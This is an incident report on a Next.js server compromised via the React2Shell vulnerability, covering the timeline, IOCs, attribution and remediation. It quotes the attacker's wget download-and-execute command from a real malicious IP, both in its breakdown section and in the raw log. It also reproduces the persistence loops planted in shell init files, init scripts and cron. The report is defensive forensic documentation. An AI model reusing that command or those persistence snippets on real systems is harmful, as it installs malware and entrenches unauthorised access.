# Incident Report: React2Shell (CVE-2025-55182) Compromise

**Date of Incident:** December 5, 2025, 11:48:41 UTC
**Date of Discovery:** December 15, 2025
**Affected System:** Tasbihfy Production Server (116.203.146.242)
**Severity:** Critical

---

## Executive Summary

A production Next.js server running Tasbihfy (Islamic PWA) was compromised via CVE-2025-55182 ("React2Shell"), a critical remote code execution vulnerability in React Server Components. The attacker exploited the vulnerability to download and execute malware, then installed persistent backdoors across 8 system locations to survive reboots.

The attack went undetected for 10 days until the server became unresponsive due to memory exhaustion from the malware's persistence mechanisms.

---

## Timeline

| Time (UTC) | Event |
|------------|-------|
| 2025-12-05 11:48:41 | Attacker exploits CVE-2025-55182 via RSC Flight protocol |
| 2025-12-05 11:48:41 | Malware downloaded from `45.76.155.14` to `/tmp/vim` |
| 2025-12-05 11:48:43 | Download complete (4.78MB, 2.1 seconds) |
| 2025-12-05 11:48:43 | Malware executed, persistence mechanisms installed |
| 2025-12-05 - 12-15 | Malware runs undetected for 10 days |
| 2025-12-15 15:21 | Site goes down (504 Gateway Timeout) |
| 2025-12-15 15:25 | Owner discovers backdoors in shell init files |
| 2025-12-15 15:42 | Backdoors cleaned, site restored |
| 2025-12-15 16:00 | Vulnerability patched (React 19.1.2, Next.js 15.5.9) |
| 2025-12-15 16:15 | Additional persistence mechanisms discovered and removed |

---

## Attack Vector

### Vulnerability: CVE-2025-55182 (React2Shell)

A critical (CVSS 10.0) remote code execution vulnerability in React Server Components affecting:
- React 19.0.0 - 19.1.1
- Next.js 14.3.0+ through 15.5.7

The vulnerability exists in the RSC "Flight" protocol due to insecure deserialization. Attacker-controlled inputs are parsed without validation, allowing unauthenticated remote code execution.

### Exploit Command Captured

The exact command executed on the server (captured in PM2 error logs):

```bash
wget http://45.76.155.14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim
```

**Breakdown:**
1. `wget http://45.76.155.14/vim -O /tmp/vim` - Download malware disguised as "vim"
2. `chmod +x /tmp/vim` - Make executable
3. `nohup /tmp/vim > /dev/null 2>&1 &` - Run in background, detached
4. `rm -f /tmp/vim` - Delete to cover tracks (failed - file remained)

---

## Malware Analysis

### Binary Details

| Property | Value |
|----------|-------|
| Filename | `/tmp/vim` |
| Size | 4,780,032 bytes (4.78 MB) |
| Source IP | 45.76.155.14 (Vultr VPS) |
| Download Speed | 2.17 MB/s |
| Timestamp | Backdated to Jan 15, 2016 (anti-forensics) |

### Malware Capabilities

Based on the persistence mechanisms installed, the malware:
1. Modifies system shell initialization files
2. Creates cron jobs for persistence
3. Modifies init system configurations
4. Spawns infinite loops to maintain execution
5. Attempts to delete itself after execution

---

## Persistence Mechanisms

The attacker installed **8 separate persistence mechanisms** across the system:

### 1. Shell Init Files (User-Level)

**`/root/.bashrc`** (lines 101-108):
```bash
while true
do
while true
do
/usr/bin/.update (deleted) startup &
sleep 30
done &
```

**`/etc/profile`** (lines 29-36):
```bash
while true
do
while true
do
/usr/bin/.update (deleted) startup &
sleep 30
done &
```

### 2. System Init Files

**`/etc/rc.local`**:
```bash
while true
do
/usr/bin/.update startup &
sleep 30
done &
```

**`/etc/inittab`**:
```
::respawn:/usr/bin/.update startup
::respawn:/usr/bin/.update (deleted) startup
```

**`/etc/init.d/boot.local`**:
```bash
while true
do
/usr/bin/.update startup &
sleep 30
done &
```

**`/etc/init.d/S99network`**:
```bash
#!/bin/sh
while true
do
/usr/bin/.update (deleted) startup &
sleep 60
done &
```

**`/etc/init.d/rcS`**:
```bash
while true
do
/usr/bin/.update startup &
sleep 30
done &
```

### 3. Cron Persistence

**`/etc/cron.d/root`**:
```
* * * * * /usr/bin/.update startup
* * * * * /usr/bin/.update (deleted) startup
```

---

## Indicators of Compromise (IOCs)

### Network IOCs

| Type | Value | Description |
|------|-------|-------------|
| IPv4 | `45.76.155.14` | Malware distribution server (Vultr) |
| URL | `http://45.76.155.14/vim` | Malware download URL |
| Port | 80/TCP | HTTP download |

### File IOCs

| Path | Type | Notes |
|------|------|-------|
| `/tmp/vim` | Malware binary | 4.78MB, timestamp 2016-01-15 |
| `/usr/bin/.update` | Malware (hidden) | Deleted but referenced |
| `/etc/cron.d/root` | Persistence | Cron job |
| `/etc/rc.local` | Persistence | Startup script |
| `/etc/inittab` | Persistence | Init config |
| `/etc/init.d/boot.local` | Persistence | Init script |
| `/etc/init.d/S99network` | Persistence | Fake network script |
| `/etc/init.d/rcS` | Persistence | RC script |

### Behavioral IOCs

- Infinite `while true` loops in shell configs
- Sleep 30/60 second intervals
- Hidden dotfiles in `/usr/bin/`
- Processes trying to execute deleted binaries
- PM2 logs containing wget output
- OOM kills on simple commands

### Attacker Signature

The attacker left a calling card message that appeared on SSH login:

```
god will save us all
```

This message was dynamically printed by the malware processes running in the background (via the persistence loops in shell init files), not a static file. The source was eliminated when the backdoor processes were killed.

---

## Vulnerable Configuration

### Before Patch

```json
{
  "dependencies": {
    "next": "15.5.2",
    "react": "19.1.0",
    "react-dom": "19.1.0",
    "better-auth": "1.3.7"
  }
}
```

### After Patch

```json
{
  "dependencies": {
    "next": "^15.5.9",
    "react": "^19.1.2",
    "react-dom": "^19.1.2",
    "better-auth": "^1.4.7"
  }
}
```

---

## Impact Assessment

### What Was Compromised

1. **Root access** - Full control of the server
2. **Application secrets** - BETTER_AUTH_SECRET exposed
3. **Database access** - PostgreSQL credentials accessible
4. **User sessions** - All active sessions potentially compromised

### What Was NOT Compromised (Confirmed)

1. **SSH keys** - No unauthorized keys added
2. **User passwords** - No evidence of exfiltration
3. **Database data** - No evidence of data theft
4. **Source code** - Git repository untouched

### Threat Actor Attribution

| Detail | Value |
|--------|-------|
| **C2 IP** | 45.76.155.14 (Vultr VPS) |
| **Malware** | COMPOOD backdoor |
| **Attribution** | Suspected China-nexus espionage (per Google TIG) |
| **Confidence** | Medium-High |

The IP address 45.76.155.14 and the exact wget command used in this attack are documented by [Google Cloud Threat Intelligence](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182) as associated with the **COMPOOD backdoor**, which has been linked to suspected China-nexus espionage activity since 2022.

Related threat actors exploiting React2Shell include:
- **UNC6603** - HISONIC backdoor deployment
- **UNC6595** - ANGRYREBEL.LINUX deployment
- Various opportunistic cryptomining operations

The timestomping (fake 2016 date on malware) matches documented TTPs of these actors.

### Likely Objectives

Based on COMPOOD capabilities and persistence mechanisms:
- Cryptocurrency mining (primary)
- Botnet participation
- Future exploitation staging
- Potential espionage (data exfiltration capability exists)

---

## Remediation Actions

### Immediate (Completed)

1. Removed all 8 persistence mechanisms
2. Killed malware processes
3. Deleted malware binary
4. Patched vulnerable dependencies
5. Rotated BETTER_AUTH_SECRET
6. Installed fail2ban for SSH protection

### Recommended (Future)

1. **Consider server rebuild** - Deep persistence suggests potential kernel-level compromise
2. **Database password rotation** - PostgreSQL credentials should be rotated
3. **API key rotation** - All third-party API keys should be rotated
4. **Security monitoring** - Deploy intrusion detection (OSSEC, Wazuh)
5. **Automated patching** - Enable dependabot or similar
6. **WAF deployment** - Consider Cloudflare WAF rules

---

## Lessons Learned

### What Went Wrong

1. **No dependency monitoring** - CVE-2025-55182 was disclosed Dec 11, server compromised Dec 5 (vulnerability existed before disclosure)
2. **No intrusion detection** - Attack went undetected for 10 days
3. **No fail2ban** - Server was under constant SSH brute force
4. **Running as root** - PM2 process ran with full privileges

### What Went Right

1. **Logs preserved** - PM2 captured the exploit command
2. **SSH key auth** - Attackers couldn't escalate via SSH
3. **Cloudflare protection** - DDoS/direct access blocked
4. **Quick response** - Full remediation in <1 hour once discovered

---

## References

- [CVE-2025-55182 - React2Shell](https://react2shell.com/)
- [Next.js Security Update Dec 11, 2025](https://nextjs.org/blog/security-update-2025-12-11)
- [Vercel CVE Summary](https://vercel.com/changelog/cve-2025-55182)
- [Palo Alto Unit42 Analysis](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- [AWS Security Blog - China-nexus Exploitation](https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/)
- [Wiz Research - React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)

---

## Appendix: Raw Evidence

### PM2 Error Log (Attack Capture)

```
--2025-12-05 11:48:41--  http://45.76.155.14/vim
Connecting to 45.76.155.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4780032 (4.6M) [application/octet-stream]
Saving to: '/tmp/vim'
...
2025-12-05 11:48:43 (2.17 MB/s) - '/tmp/vim' saved [4780032/4780032]

⨯ Error: Command failed: wget http://45.76.155.14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim
```

### SSH Brute Force Attempts (Sample)

During the attack window, the server received continuous SSH brute force from:
- 80.94.92.* (multiple IPs)
- 92.118.39.* (multiple IPs)
- 68.183.7.144
- 209.38.35.225
- 103.85.115.149
- And dozens more...

All attempts failed due to SSH key authentication.

---

**Report Generated:** December 15, 2025
**Classification:** Internal Use Only
